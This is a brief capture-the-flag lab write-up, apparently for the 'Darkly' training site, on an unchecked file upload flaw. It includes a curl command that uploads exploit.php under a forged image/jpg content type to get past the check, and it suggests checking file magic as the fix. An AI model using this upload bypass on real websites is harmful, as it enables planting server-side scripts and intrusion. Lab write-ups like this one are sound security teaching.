# Unchecked File Upload

## Vulnerability

In the middle of the page, there is a link `ADD IMAGE` redirecting to: [`index.php?page=upload`](http://darkly/index.php?page=upload).

Uploading a PNG file, give an error:
```
Your image was not uploaded.
```
Uploading a JPG file, give a result: 
```
/tmp/file.jpg succesfully uploaded.
```

The file content itself isn't checked. Only the file name.

Uploading a file with a name not containing `jpg` BUT still having the `jpg` content-type give the flag.
```bash
$ curl \
    -F 'Upload=Upload' \
    -F "uploaded=@exploit.php;type=image/jpg" \
    -F 'MAX_FILE_SIZE=100000' \
    'http://darkly/?page=upload'
...
<h2>The flag is : ...</h2>
...
```

## Possible Fix

- Check the file magic.
